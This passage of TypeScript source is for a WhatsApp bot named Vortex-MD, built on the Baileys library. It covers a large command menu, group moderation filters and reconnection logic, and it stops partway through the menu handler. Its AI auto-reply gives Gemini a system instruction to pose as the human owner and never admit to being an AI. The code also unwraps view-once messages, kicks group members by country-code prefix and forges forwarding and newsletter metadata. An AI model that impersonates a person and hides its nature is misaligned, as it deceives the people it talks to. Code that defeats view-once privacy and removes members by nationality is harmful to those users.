import express from "express";
import { createServer as createViteServer } from "vite";
import makeWASocket, { useMultiFileAuthState, DisconnectReason, fetchLatestBaileysVersion, downloadMediaMessage, downloadContentFromMessage } from '@whiskeysockets/baileys';
import pino from 'pino';
import fs from 'fs';
import path from 'path';
import os from 'os';
import yts from 'yt-search';
import axios from 'axios';
import ytdl from '@distube/ytdl-core';
import ffmpeg from 'fluent-ffmpeg';
import ffmpegInstaller from '@ffmpeg-installer/ffmpeg';
import { GoogleGenAI } from '@google/genai';
import { Sticker, createSticker, StickerTypes } from 'wa-sticker-formatter';

const ai = new GoogleGenAI({ apiKey: process.env.GEMINI_API_KEY });

ffmpeg.setFfmpegPath(ffmpegInstaller.path);

async function getMediaBuffer(message: any, type: 'image' | 'video' | 'sticker') {
    const stream = await downloadContentFromMessage(message, type);
    let buffer = Buffer.from([]);
    for await(const chunk of stream) {
        buffer = Buffer.concat([buffer, chunk]);
    }
    return buffer;
}

const app = express();
app.use(express.json());

const PORT = 3000;

const startTime = Date.now();

// AI Tasks Queue
interface AITask {
    id: string;
    prompt: string;
    remoteJid: string;
    status: 'pending' | 'processing' | 'completed' | 'failed';
}
const aiTasks: AITask[] = [];

const commands = [
    // 1. General (10)
    { name: 'menu', emoji: '📜', module: 'General' },
    { name: 'info', emoji: 'ℹ️', module: 'General' },
    { name: 'ping', emoji: '🏓', module: 'General' },
    { name: 'owner', emoji: '👑', module: 'General' },
    { name: 'rules', emoji: '📋', module: 'General' },
    { name: 'help', emoji: '❓', module: 'General' },
    { name: 'creator', emoji: '👨‍💻', module: 'General' },
    { name: 'runtime', emoji: '⏳', module: 'General' },
    { name: 'lang', emoji: '🌐', module: 'General' },
    { name: 'speed', emoji: '⚡', module: 'General' },
    { name: 'donate', emoji: '☕', module: 'General' },
    { name: 'autoreact', emoji: '🎭', module: 'General' },
    { name: 'aisupport', emoji: '🤖', module: 'General' },
    { name: 'react', emoji: '💥', module: 'General' },

    // 2. Group Moderation (20)
    { name: 'kick', emoji: '👢', module: 'Moderation' },
    { name: 'add', emoji: '➕', module: 'Moderation' },
    { name: 'promote', emoji: '⭐', module: 'Moderation' },
    { name: 'demote', emoji: '⬇️', module: 'Moderation' },
    { name: 'mute', emoji: '🔇', module: 'Moderation' },
    { name: 'unmute', emoji: '🔊', module: 'Moderation' },
    { name: 'setname', emoji: '✏️', module: 'Moderation' },
    { name: 'setdesc', emoji: '📝', module: 'Moderation' },
    { name: 'link', emoji: '🔗', module: 'Moderation' },
    { name: 'revoke', emoji: '🔄', module: 'Moderation' },
    { name: 'tagall', emoji: '📢', module: 'Moderation' },
    { name: 'hidetag', emoji: '👻', module: 'Moderation' },
    { name: 'warn', emoji: '⚠️', module: 'Moderation' },
    { name: 'unwarn', emoji: '✅', module: 'Moderation' },
    { name: 'warnings', emoji: '📊', module: 'Moderation' },
    { name: 'del', emoji: '🗑️', module: 'Moderation' },
    { name: 'lock', emoji: '🔒', module: 'Moderation' },
    { name: 'unlock', emoji: '🔓', module: 'Moderation' },
    { name: 'setpp', emoji: '🖼️', module: 'Moderation' },
    { name: 'leave', emoji: '👋', module: 'Moderation' },

    // 3. Protection (20)
    { name: 'antilink', emoji: '🚫', module: 'Protection' },
    { name: 'antispam', emoji: '🛡️', module: 'Protection' },
    { name: 'antibot', emoji: '🤖', module: 'Protection' },
    { name: 'antifake', emoji: '🎭', module: 'Protection' },
    { name: 'antidelete', emoji: '👁️', module: 'Protection' },
    { name: 'antiviewonce', emoji: '📸', module: 'Protection' },
    { name: 'antitoxic', emoji: '🤬', module: 'Protection' },
    { name: 'autokick', emoji: '⚡', module: 'Protection' },
    { name: 'onlyadmin', emoji: '👑', module: 'Protection' },
    { name: 'antiforeign', emoji: '🌍', module: 'Protection' },
    { name: 'antipicture', emoji: '🖼️', module: 'Protection' },
    { name: 'antivideo', emoji: '🎥', module: 'Protection' },
    { name: 'antiaudio', emoji: '🎵', module: 'Protection' },
    { name: 'antidocument', emoji: '📄', module: 'Protection' },
    { name: 'anticall', emoji: '📞', module: 'Protection' },
    { name: 'antimention', emoji: '📢', module: 'Protection' },
    { name: 'antiforward', emoji: '➡️', module: 'Protection' },
    { name: 'anticontact', emoji: '👤', module: 'Protection' },
    { name: 'antilocation', emoji: '📍', module: 'Protection' },
    { name: 'antipoll', emoji: '📊', module: 'Protection' },

    // 4. Owner (15)
    { name: 'ban', emoji: '🔨', module: 'Owner' },
    { name: 'unban', emoji: '🕊️', module: 'Owner' },
    { name: 'broadcast', emoji: '📡', module: 'Owner' },
    { name: 'block', emoji: '🛑', module: 'Owner' },
    { name: 'unblock', emoji: '🟢', module: 'Owner' },
    { name: 'setprefix', emoji: '⌨️', module: 'Owner' },
    { name: 'setmode', emoji: '⚙️', module: 'Owner' },
    { name: 'restart', emoji: '🔄', module: 'Owner' },
    { name: 'join', emoji: '🚪', module: 'Owner' },
    { name: 'clear', emoji: '🧹', module: 'Owner' },
    { name: 'addprem', emoji: '💎', module: 'Owner' },
    { name: 'delprem', emoji: '🗑️', module: 'Owner' },
    { name: 'listprem', emoji: '📝', module: 'Owner' },
    { name: 'banchat', emoji: '🚫', module: 'Owner' },
    { name: 'unbanchat', emoji: '✅', module: 'Owner' },

    // 5. Tools (15)
    { name: 'sticker', emoji: '🖼️', module: 'Tools' },
    { name: 'getsticker', emoji: '🔍', module: 'Tools' },
    { name: 'toimg', emoji: '📷', module: 'Tools' },
    { name: 'tts', emoji: '🗣️', module: 'Tools' },
    { name: 'translate', emoji: '🌐', module: 'Tools' },
    { name: 'weather', emoji: '🌤️', module: 'Tools' },
    { name: 'calc', emoji: '🧮', module: 'Tools' },
    { name: 'wiki', emoji: '📚', module: 'Tools' },
    { name: 'github', emoji: '🐙', module: 'Tools' },
    { name: 'crypto', emoji: '💰', module: 'Tools' },
    { name: 'qr', emoji: '🔳', module: 'Tools' },
    { name: 'shorturl', emoji: '🔗', module: 'Tools' },
    { name: 'base64', emoji: '🔐', module: 'Tools' },
    { name: 'password', emoji: '🔑', module: 'Tools' },
    { name: 'styletext', emoji: '🔤', module: 'Tools' },
    { name: 'readmore', emoji: '📖', module: 'Tools' },
    { name: 'math', emoji: '➗', module: 'Tools' },
    { name: 'timer', emoji: '⏱️', module: 'Tools' },
    { name: 'reminder', emoji: '⏰', module: 'Tools' },

    // 6. Fun (10)
    { name: 'joke', emoji: '😂', module: 'Fun' },
    { name: 'meme', emoji: '🤣', module: 'Fun' },
    { name: 'lyrics', emoji: '🎤', module: 'Fun' },
    { name: 'truth', emoji: '🤫', module: 'Fun' },
    { name: 'dare', emoji: '😈', module: 'Fun' },
    { name: 'flipcoin', emoji: '🪙', module: 'Fun' },
    { name: 'roll', emoji: '🎲', module: 'Fun' },
    { name: '8ball', emoji: '🎱', module: 'Fun' },
    { name: 'ship', emoji: '❤️', module: 'Fun' },
    { name: 'rate', emoji: '⭐', module: 'Fun' },
    { name: 'dog', emoji: '🐶', module: 'Fun' },
    { name: 'cat', emoji: '🐱', module: 'Fun' },
    { name: 'fact', emoji: '🧠', module: 'Fun' },
    { name: 'bug', emoji: '🐛', module: 'Fun' },

    // 7. Downloads (10)
    { name: 'play', emoji: '🎵', module: 'Downloads' },
    { name: 'ytmp3', emoji: '🎧', module: 'Downloads' },
    { name: 'ytmp4', emoji: '🎬', module: 'Downloads' },
    { name: 'ig', emoji: '📸', module: 'Downloads' },
    { name: 'fb', emoji: '📘', module: 'Downloads' },
    { name: 'tiktok', emoji: '🎵', module: 'Downloads' },
    { name: 'twitter', emoji: '🐦', module: 'Downloads' },
    { name: 'spotify', emoji: '🎧', module: 'Downloads' },
    { name: 'pinterest', emoji: '📌', module: 'Downloads' },
    { name: 'gitclone', emoji: '🐙', module: 'Downloads' },

    // 8. Search (10)
    { name: 'google', emoji: '🔍', module: 'Search' },
    { name: 'wiki', emoji: '📚', module: 'Search' },
    { name: 'github', emoji: '🐙', module: 'Search' },
    { name: 'npm', emoji: '📦', module: 'Search' },
    { name: 'lyrics', emoji: '🎤', module: 'Search' },
    { name: 'imdb', emoji: '🎬', module: 'Search' },
    { name: 'weather', emoji: '🌤️', module: 'Search' },
    { name: 'define', emoji: '📖', module: 'Search' },
    { name: 'anime', emoji: '🌸', module: 'Search' },
    { name: 'manga', emoji: '📚', module: 'Search' },

    // 9. AI (5)
    { name: 'ai', emoji: '🧠', module: 'AI' },
    { name: 'imagine', emoji: '🎨', module: 'AI' },
    { name: 'gpt', emoji: '💬', module: 'AI' },
    { name: 'dalle', emoji: '🖼️', module: 'AI' },
    { name: 'gemini', emoji: '✨', module: 'AI' },

    // 10. Media & Status (10)
    { name: 'vv', emoji: '👁️', module: 'Media' },
    { name: 'status', emoji: '📥', module: 'Media' },
    { name: 'getstatus', emoji: '📲', module: 'Media' },
    { name: 'save', emoji: '💾', module: 'Media' },
    { name: 'forward', emoji: '➡️', module: 'Media' },
    { name: 'quote', emoji: '💬', module: 'Media' },
    { name: 'take', emoji: 'steal', module: 'Media' },
    { name: 'wm', emoji: '©️', module: 'Media' },
    { name: 'exif', emoji: '📸', module: 'Media' },
    { name: 'tourl', emoji: '🔗', module: 'Media' },

    // 11. Advanced Moderation (20)
    { name: 'warn1', emoji: '1️⃣', module: 'Advanced Mod' },
    { name: 'warn2', emoji: '2️⃣', module: 'Advanced Mod' },
    { name: 'warn3', emoji: '3️⃣', module: 'Advanced Mod' },
    { name: 'resetwarns', emoji: '🔄', module: 'Advanced Mod' },
    { name: 'kickall', emoji: '👢', module: 'Advanced Mod' },
    { name: 'banall', emoji: '🔨', module: 'Advanced Mod' },
    { name: 'muteall', emoji: '🔇', module: 'Advanced Mod' },
    { name: 'unmuteall', emoji: '🔊', module: 'Advanced Mod' },
    { name: 'lockall', emoji: '🔒', module: 'Advanced Mod' },
    { name: 'unlockall', emoji: '🔓', module: 'Advanced Mod' },
    { name: 'setrules', emoji: '📋', module: 'Advanced Mod' },
    { name: 'delrules', emoji: '🗑️', module: 'Advanced Mod' },
    { name: 'setwelcome', emoji: '👋', module: 'Advanced Mod' },
    { name: 'delwelcome', emoji: '🗑️', module: 'Advanced Mod' },
    { name: 'setgoodbye', emoji: '👋', module: 'Advanced Mod' },
    { name: 'delgoodbye', emoji: '🗑️', module: 'Advanced Mod' },
    { name: 'setpromote', emoji: '⭐', module: 'Advanced Mod' },
    { name: 'delpromote', emoji: '🗑️', module: 'Advanced Mod' },
    { name: 'setdemote', emoji: '⬇️', module: 'Advanced Mod' },
    { name: 'deldemote', emoji: '🗑️', module: 'Advanced Mod' },

    // 12. Economy & RPG (20)
    { name: 'balance', emoji: '💰', module: 'Economy' },
    { name: 'bank', emoji: '🏦', module: 'Economy' },
    { name: 'deposit', emoji: '📥', module: 'Economy' },
    { name: 'withdraw', emoji: '📤', module: 'Economy' },
    { name: 'transfer', emoji: '💸', module: 'Economy' },
    { name: 'daily', emoji: '📅', module: 'Economy' },
    { name: 'weekly', emoji: '📆', module: 'Economy' },
    { name: 'monthly', emoji: '🗓️', module: 'Economy' },
    { name: 'work', emoji: '💼', module: 'Economy' },
    { name: 'mine', emoji: '⛏️', module: 'Economy' },
    { name: 'fish', emoji: '🎣', module: 'Economy' },
    { name: 'hunt', emoji: '🏹', module: 'Economy' },
    { name: 'rob', emoji: '🦹', module: 'Economy' },
    { name: 'gamble', emoji: '🎲', module: 'Economy' },
    { name: 'slots', emoji: '🎰', module: 'Economy' },
    { name: 'roulette', emoji: '🎡', module: 'Economy' },
    { name: 'inventory', emoji: '🎒', module: 'Economy' },
    { name: 'shop', emoji: '🛒', module: 'Economy' },
    { name: 'buy', emoji: '🛍️', module: 'Economy' },
    { name: 'sell', emoji: '💰', module: 'Economy' },

    // 13. Games (15)
    { name: 'tictactoe', emoji: '❌', module: 'Games' },
    { name: 'delttt', emoji: '🗑️', module: 'Games' },
    { name: 'guessword', emoji: '🔠', module: 'Games' },
    { name: 'guessnumber', emoji: '🔢', module: 'Games' },
    { name: 'mathgame', emoji: '➗', module: 'Games' },
    { name: 'trivia', emoji: '🧠', module: 'Games' },
    { name: 'hangman', emoji: '🪢', module: 'Games' },
    { name: 'wordchain', emoji: '🔗', module: 'Games' },
    { name: 'rps', emoji: '✊', module: 'Games' },
    { name: 'connect4', emoji: '🔴', module: 'Games' },
    { name: 'chess', emoji: '♟️', module: 'Games' },
    { name: 'checkers', emoji: '🏁', module: 'Games' },
    { name: 'uno', emoji: '🃏', module: 'Games' },
    { name: 'poker', emoji: '🃏', module: 'Games' },
    { name: 'blackjack', emoji: '🃏', module: 'Games' },

    // 14. Utility (15)
    { name: 'afk', emoji: '💤', module: 'Utility' },
    { name: 'unafk', emoji: '🔔', module: 'Utility' },
    { name: 'report', emoji: '🚩', module: 'Utility' },
    { name: 'suggest', emoji: '💡', module: 'Utility' },
    { name: 'bug', emoji: '🐛', module: 'Utility' },
    { name: 'feedback', emoji: '📝', module: 'Utility' },
    { name: 'poll', emoji: '📊', module: 'Utility' },
    { name: 'vote', emoji: '🗳️', module: 'Utility' },
    { name: 'endpoll', emoji: '🛑', module: 'Utility' },
    { name: 'calculate', emoji: '🧮', module: 'Utility' },
    { name: 'convert', emoji: '🔄', module: 'Utility' },
    { name: 'timezone', emoji: '🌍', module: 'Utility' },
    { name: 'currency', emoji: '💱', module: 'Utility' },
    { name: 'crypto', emoji: '🪙', module: 'Utility' },
    { name: 'stocks', emoji: '📈', module: 'Utility' },

    // 15. System (10)
    { name: 'sysinfo', emoji: '💻', module: 'System' },
    { name: 'cpu', emoji: '🧠', module: 'System' },
    { name: 'ram', emoji: '💾', module: 'System' },
    { name: 'disk', emoji: '💿', module: 'System' },
    { name: 'network', emoji: '🌐', module: 'System' },
    { name: 'os', emoji: '🖥️', module: 'System' },
    { name: 'uptime', emoji: '⏳', module: 'System' },
    { name: 'logs', emoji: '📜', module: 'System' },
    { name: 'clearlogs', emoji: '🧹', module: 'System' },
    { name: 'update', emoji: '🔄', module: 'System' },

    // 16. Developer (10)
    { name: 'eval', emoji: '💻', module: 'Developer' },
    { name: 'exec', emoji: '⚙️', module: 'Developer' },
    { name: 'shell', emoji: '🐚', module: 'Developer' },
    { name: 'db', emoji: '🗄️', module: 'Developer' },
    { name: 'query', emoji: '🔍', module: 'Developer' },
    { name: 'backup', emoji: '💾', module: 'Developer' },
    { name: 'restore', emoji: '🔄', module: 'Developer' },
    { name: 'test', emoji: '🧪', module: 'Developer' },
    { name: 'debug', emoji: '🐛', module: 'Developer' },
    { name: 'reload', emoji: '🔄', module: 'Developer' },

    // 17. Anime & Manga (15)
    { name: 'waifu', emoji: '🌸', module: 'Anime' },
    { name: 'neko', emoji: '🐱', module: 'Anime' },
    { name: 'husbando', emoji: '🤵', module: 'Anime' },
    { name: 'kitsune', emoji: '🦊', module: 'Anime' },
    { name: 'hug', emoji: '🫂', module: 'Anime' },
    { name: 'kiss', emoji: '💋', module: 'Anime' },
    { name: 'pat', emoji: '✋', module: 'Anime' },
    { name: 'slap', emoji: '👋', module: 'Anime' },
    { name: 'cuddle', emoji: '🤗', module: 'Anime' },
    { name: 'cry', emoji: '😢', module: 'Anime' },
    { name: 'smug', emoji: '😏', module: 'Anime' },
    { name: 'bonk', emoji: '🔨', module: 'Anime' },
    { name: 'yeet', emoji: '🚀', module: 'Anime' },
    { name: 'blush', emoji: '😳', module: 'Anime' },
    { name: 'smile', emoji: '😊', module: 'Anime' },
];

declare global {
    var spamTracker: { [key: string]: number[] };
}

function formatUptime(uptimeMs: number) {
    const seconds = Math.floor((uptimeMs / 1000) % 60);
    const minutes = Math.floor((uptimeMs / (1000 * 60)) % 60);
    const hours = Math.floor((uptimeMs / (1000 * 60 * 60)) % 24);
    const days = Math.floor(uptimeMs / (1000 * 60 * 60 * 24));

    const parts = [];
    if (days > 0) parts.push(`${days}d`);
    if (hours > 0) parts.push(`${hours}h`);
    if (minutes > 0) parts.push(`${minutes}m`);
    if (seconds > 0) parts.push(`${seconds}s`);

    return parts.join(' ') || '0s';
}

function generateMenu(username: string, config: any) {
    const uptime = formatUptime(Date.now() - startTime);
    const status = config.mode === 'public' ? 'Public' : 'Private';
    
    let menuText = `╭── ❀ VORTEX-MD ❀──╮
│ 🤵 User: ${username}
│ 🤖 Bot: Vortex-MD
│ 🛠 Status: ${status}
│ 🕝 Uptime: ${uptime}
│ 👑 Owner: Samy Charles
╰────────────────╯\n\n`;

    const modules: { [key: string]: typeof commands } = {};
    for (const cmd of commands) {
        if (!modules[cmd.module]) modules[cmd.module] = [];
        modules[cmd.module].push(cmd);
    }

    for (const [moduleName, cmds] of Object.entries(modules)) {
        menuText += `╭─ ◈ ${moduleName} ◈ ─╮\n`;
        for (const cmd of cmds) {
            menuText += `│ ${cmd.emoji} ${config.prefix}${cmd.name}\n`;
        }
        menuText += `╰────────────────╯\n\n`;
    }

    menuText += `🔗 *Lien Officiel:* https://whatsapp.com/channel/0029Vb7AruX8fewz8dSRD340`;

    return menuText.trim();
}

interface BotSession {
    id: string;
    sock: any;
    status: 'disconnected' | 'connecting' | 'connected';
    phoneNumber?: string;
    isReconnecting: boolean;
    reconnectInterval: NodeJS.Timeout | null;
}
const sessions = new Map<string, BotSession>();

const configPath = path.join(process.cwd(), 'bot-config.json');
function getConfig() {
  if (fs.existsSync(configPath)) {
    const cfg = JSON.parse(fs.readFileSync(configPath, 'utf-8'));
    const arrays = ['antilink', 'antispam', 'antibot', 'antifake', 'antidelete', 'antiviewonce', 'autokick', 'onlyadmin', 'antimention', 'antitoxic', 'antiforward', 'antipicture', 'antivideo', 'antiaudio', 'antidocument', 'anticontact', 'antilocation', 'antipoll'];
    arrays.forEach(arr => {
        if (!cfg[arr]) cfg[arr] = [];
    });
    if (!cfg.language) cfg.language = 'fr';
    if (typeof cfg.autoreact === 'undefined') cfg.autoreact = false;
    if (typeof cfg.aisupport === 'undefined') cfg.aisupport = false;
    return cfg;
  }
  return { prefix: '.', mode: 'public', language: 'fr', autoreact: false, aisupport: false, antilink: [], antispam: [], antibot: [], antifake: [], antidelete: [], antiviewonce: [], autokick: [], onlyadmin: [], antimention: [], antitoxic: [], antiforward: [], antipicture: [], antivideo: [], antiaudio: [], antidocument: [], anticontact: [], antilocation: [], antipoll: [] };
}

function saveConfig(config: any) {
  fs.writeFileSync(configPath, JSON.stringify(config, null, 2));
}

async function startBot(sessionId: string, phoneNumber?: string): Promise<string | null> {
    let session = sessions.get(sessionId);
    if (!session) {
        session = {
            id: sessionId,
            sock: null,
            status: 'disconnected',
            phoneNumber,
            isReconnecting: false,
            reconnectInterval: null
        };
        sessions.set(sessionId, session);
    }

    if (session.status === 'connecting') return null;
    session.status = 'connecting';

    const { state, saveCreds } = await useMultiFileAuthState(`sessions/${sessionId}`);
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        version,
        logger: pino({ level: 'silent' }) as any,
        printQRInTerminal: false,
        auth: state,
        browser: ['Ubuntu', 'Chrome', '20.0.0'],
        generateHighQualityLinkPreview: true,
    });
    session.sock = sock;

    sock.ev.on('creds.update', saveCreds);

    sock.ev.on('connection.update', async (update: any) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'close') {
            session!.status = 'disconnected';
            const shouldReconnect = (lastDisconnect?.error as any)?.output?.statusCode !== DisconnectReason.loggedOut;
            if (shouldReconnect) {
                session!.isReconnecting = true;
                setTimeout(() => startBot(sessionId), 3000); // Wait 3s before reconnecting
            } else {
                fs.rmSync(`sessions/${sessionId}`, { recursive: true, force: true });
                sessions.delete(sessionId);
            }
        } else if (connection === 'open') {
            session!.status = 'connected';
            console.log(`Session ${sessionId} connected to WhatsApp!`);
            try {
                const id = sock.user.id.split(':')[0] + '@s.whatsapp.net';
                if (session!.isReconnecting) {
                    await sock.sendMessage(id, { text: '⚠️ Vortex-MD detected a disconnection.\nAttempting to reconnect to stay active...' });
                    await new Promise(resolve => setTimeout(resolve, 1000));
                    await sock.sendMessage(id, { text: '✅ Vortex-MD successfully reconnected and is now active.' });
                    session!.isReconnecting = false;
                } else {
                    await sock.sendMessage(id, { text: '✅ Vortex-MD is now successfully connected to your WhatsApp account.' });
                }
            } catch (err) {
                console.error('Failed to send welcome message:', err);
            }
        }
    });

    if (!session.reconnectInterval) {
        session.reconnectInterval = setInterval(() => {
            if (session!.status === 'disconnected') {
                console.log(`5-minute check: Session ${sessionId} is disconnected. Attempting to reconnect...`);
                session!.isReconnecting = true;
                startBot(sessionId);
            }
        }, 5 * 60 * 1000); // 5 minutes
    }

    sock.ev.on('messages.upsert', async (m: any) => {
        let msg = m.messages[0];
        if (!msg.message) return;

        // Unwrap message
        if (msg.message.ephemeralMessage) {
            msg.message = msg.message.ephemeralMessage.message;
        } else if (msg.message.viewOnceMessage) {
            msg.message = msg.message.viewOnceMessage.message;
        } else if (msg.message.viewOnceMessageV2) {
            msg.message = msg.message.viewOnceMessageV2.message;
        } else if (msg.message.viewOnceMessageV2Extension) {
            msg.message = msg.message.viewOnceMessageV2Extension.message;
        } else if (msg.message.documentWithCaptionMessage) {
            msg.message = msg.message.documentWithCaptionMessage.message;
        }

        const config = getConfig();
        const text = msg.message.conversation || msg.message.extendedTextMessage?.text || msg.message.imageMessage?.caption || msg.message.videoMessage?.caption || '';
        
        const isFromMe = msg.key.fromMe;
        
        // Auto-react to statuses
        if (msg.key.remoteJid === 'status@broadcast' && !isFromMe) {
            try {
                await sock.sendMessage(msg.key.remoteJid, { react: { text: '🗽', key: msg.key } });
            } catch (err) {
                console.error('Failed to auto-react to status:', err);
            }
            return; // Don't process commands on statuses
        }

        const isGroup = msg.key.remoteJid?.endsWith('@g.us');
        const sender = msg.key.participant || msg.key.remoteJid;
        
        // Auto-react feature
        if (config.autoreact && !isFromMe && msg.key.remoteJid !== 'status@broadcast') {
            const emojis = ['❤️', '😂', '🔥', '👍', '🙌', '👀', '💯', '✨', '🎉', '🤔', '😎', '👌', '🙏', '💡', '🌟'];
            const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
            try {
                await sock.sendMessage(msg.key.remoteJid, { react: { text: randomEmoji, key: msg.key } });
            } catch (e) {
                console.error('Failed to autoreact:', e);
            }
        }

        // AI Support feature (private messages only, when not a command)
        if (config.aisupport && !isGroup && !text.startsWith(config.prefix) && text.trim().length > 0) {
            // Allow testing from the owner's own number, but prevent infinite loops by checking if the message is from the AI
            const isSelfChat = msg.key.remoteJid === sock.user.id.split(':')[0] + '@s.whatsapp.net';
            
            if (!isFromMe || (isSelfChat && !text.includes('🤖'))) {
                try {
                    const response = await ai.models.generateContent({
                        model: 'gemini-3.1-flash-preview',
                        contents: text,
                        config: {
                            systemInstruction: "Tu es Samy Charles, le créateur de Vortex-MD. Réponds de manière naturelle, amicale et un peu cool, comme si tu parlais à un ami sur WhatsApp. Ne dis pas que tu es une IA. Ajoute parfois un petit emoji discret."
                        }
                    });
                    if (response.text) {
                        const replyText = isSelfChat ? `🤖 ${response.text}` : response.text;
                        await sock.sendMessage(msg.key.remoteJid, { text: replyText }, { quoted: msg });
                    }
                } catch (e) {
                    console.error('AI Support Error:', e);
                }
            }
        }

        if (config.mode === 'private' && !isFromMe) {
            return;
        }

        // --- SECURITY INTERCEPTORS ---
        if (isGroup && !isFromMe) {
            try {
                const groupMetadata = await sock.groupMetadata(msg.key.remoteJid);
                const isAdmin = groupMetadata.participants.find((p: any) => p.id === sender)?.admin;
                const botId = sock.user.id.split(':')[0] + '@s.whatsapp.net';
                const isBotAdmin = groupMetadata.participants.find((p: any) => p.id === botId)?.admin;

                if (isBotAdmin && !isAdmin) {
                    // 0. Anti Spam
                    if (config.antispam?.includes(msg.key.remoteJid)) {
                        const now = Date.now();
                        if (!global.spamTracker) global.spamTracker = {};
                        if (!global.spamTracker[sender]) global.spamTracker[sender] = [];
                        global.spamTracker[sender].push(now);
                        global.spamTracker[sender] = global.spamTracker[sender].filter((t: number) => now - t < 10000); // messages in last 10 seconds
                        
                        if (global.spamTracker[sender].length > 5) { // 5 messages in 10 seconds
                            await sock.sendMessage(msg.key.remoteJid, { delete: msg.key });
                            await sock.groupParticipantsUpdate(msg.key.remoteJid, [sender], 'remove');
                            await sock.sendMessage(msg.key.remoteJid, { text: `⚠️ @${sender.split('@')[0]} was kicked for spamming!`, mentions: [sender] });
                            return;
                        }
                    }

                    // 1. Only Admin
                    if (config.onlyadmin?.includes(msg.key.remoteJid)) {
                        await sock.sendMessage(msg.key.remoteJid, { delete: msg.key });
                        return;
                    }

                    // 2. Anti Link & Auto Kick
                    if (config.antilink?.includes(msg.key.remoteJid)) {
                        const urlRegex = /(https?:\/\/[^\s]+)/g;
                        const waMeRegex = /(wa\.me\/[^\s]+)/g;
                        if (text.match(urlRegex) || text.match(waMeRegex)) {
                            await sock.sendMessage(msg.key.remoteJid, { delete: msg.key });
                            if (config.autokick?.includes(msg.key.remoteJid)) {
                                await sock.groupParticipantsUpdate(msg.key.remoteJid, [sender], 'remove');
                                await sock.sendMessage(msg.key.remoteJid, { text: `⚠️ @${sender.split('@')[0]} was kicked for sending links!`, mentions: [sender] });
                            } else {
                                await sock.sendMessage(msg.key.remoteJid, { text: `⚠️ @${sender.split('@')[0]}, links are not allowed in this group!`, mentions: [sender] });
                            }
                            return;
                        }
                    }

                    // 3. Anti Mention (Delete if they tag anyone or @all)
                    const mentionedJid = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
                    if (config.antimention?.includes(msg.key.remoteJid) && (mentionedJid.length > 0 || text.includes('@all') || text.includes('@everyone'))) {
                        await sock.sendMessage(msg.key.remoteJid, { delete: msg.key });
                        await sock.sendMessage(msg.key.remoteJid, { text: `⚠️ @${sender.split('@')[0]}, mentions are disabled in this group!`, mentions: [sender] });
                        return;
                    }

                    // 4. Anti Bot (Kick if ID looks like a bot)
                    if (config.antibot?.includes(msg.key.remoteJid) && (msg.key.id.startsWith('BAE5') || msg.key.id.length === 22 || msg.key.id.length > 30)) {
                        await sock.sendMessage(msg.key.remoteJid, { delete: msg.key });
                        await sock.groupParticipantsUpdate(msg.key.remoteJid, [sender], 'remove');
                        return;
                    }

                    // 5. Anti Fake (Kick virtual/foreign numbers)
                    if (config.antifake?.includes(msg.key.remoteJid)) {
                        const fakePrefixes = ['1', '44', '48', '7', '92', '212', '94'];
                        const senderPrefix = sender.split('@')[0].substring(0, 2);
                        const senderPrefix1 = sender.split('@')[0].substring(0, 1);
                        if (fakePrefixes.includes(senderPrefix) || fakePrefixes.includes(senderPrefix1)) {
                            await sock.groupParticipantsUpdate(msg.key.remoteJid, [sender], 'remove');
                            return;
                        }
                    }

                    // 6. Anti Forward
                    if (config.antiforward?.includes(msg.key.remoteJid) && msg.message?.extendedTextMessage?.contextInfo?.isForwarded) {
                        await sock.sendMessage(msg.key.remoteJid, { delete: msg.key });
                        return;
                    }

                    // 7. Anti Media/Types
                    const msgType = Object.keys(msg.message)[0];
                    if (config.antipicture?.includes(msg.key.remoteJid) && msgType === 'imageMessage') { await sock.sendMessage(msg.key.remoteJid, { delete: msg.key }); return; }
                    if (config.antivideo?.includes(msg.key.remoteJid) && msgType === 'videoMessage') { await sock.sendMessage(msg.key.remoteJid, { delete: msg.key }); return; }
                    if (config.antiaudio?.includes(msg.key.remoteJid) && msgType === 'audioMessage') { await sock.sendMessage(msg.key.remoteJid, { delete: msg.key }); return; }
                    if (config.antidocument?.includes(msg.key.remoteJid) && msgType === 'documentMessage') { await sock.sendMessage(msg.key.remoteJid, { delete: msg.key }); return; }
                    if (config.anticontact?.includes(msg.key.remoteJid) && msgType === 'contactMessage') { await sock.sendMessage(msg.key.remoteJid, { delete: msg.key }); return; }
                    if (config.antilocation?.includes(msg.key.remoteJid) && msgType === 'locationMessage') { await sock.sendMessage(msg.key.remoteJid, { delete: msg.key }); return; }
                    if (config.antipoll?.includes(msg.key.remoteJid) && msgType === 'pollCreationMessage') { await sock.sendMessage(msg.key.remoteJid, { delete: msg.key }); return; }
                }
            } catch (err) {
                console.error('Security interceptor error:', err);
            }
        }
        // --- END SECURITY INTERCEPTORS ---

        if (text.startsWith(config.prefix)) {
            const args = text.slice(config.prefix.length).trim().split(/ +/);
            const cmd = args.shift()?.toLowerCase();
            const username = msg.pushName || 'User';
            const isGroup = msg.key.remoteJid?.endsWith('@g.us');
            
            const mentionedJid = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
            const quotedMessage = msg.message?.extendedTextMessage?.contextInfo?.participant;
            if (quotedMessage && !mentionedJid.includes(quotedMessage)) {
                mentionedJid.push(quotedMessage);
            }

            if (cmd === 'ping' || cmd === 'speed') {
                const start = Date.now();
                const sentMsg = await sock.sendMessage(msg.key.remoteJid, { text: 'Pong ! 🏓' }, { quoted: msg });
                const end = Date.now();
                const ping = end - start;
                setTimeout(async () => {
                    if (sentMsg) {
                        await sock.sendMessage(msg.key.remoteJid, { text: `Pong ! 🏓\n*VITESSE:* ${ping}ms`, edit: sentMsg.key });
                    }
                }, 100);
            } else if (cmd === 'menu' || cmd === 'help') {
                await sock.sendMessage(msg.key.remoteJid, { react: { text: '🧑‍🔬', key: msg.key } });
                const menuText = generateMenu(username, config);
                
                // Send menu image + text
                await sock.sendMessage(msg.key.remoteJid, { 
                    image: { url: 'https://lieixmgdboiceopzksvu.supabase.co/storage/v1/object/public/hosted-files/dplxl579-1773170410582.jpg' },
                    caption: menuText,
                    contextInfo: {
                        forwardingScore: 999,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: '120363406104843715@newsletter',
                            newsletterName: 'VORTEX-MD CHANNEL',
                            serverMessageId: 100
                        },
                        externalAdReply: {
                            title: "VORTEX-MD CHANNEL",
                            body: "Rejoins notre chaîne officielle",
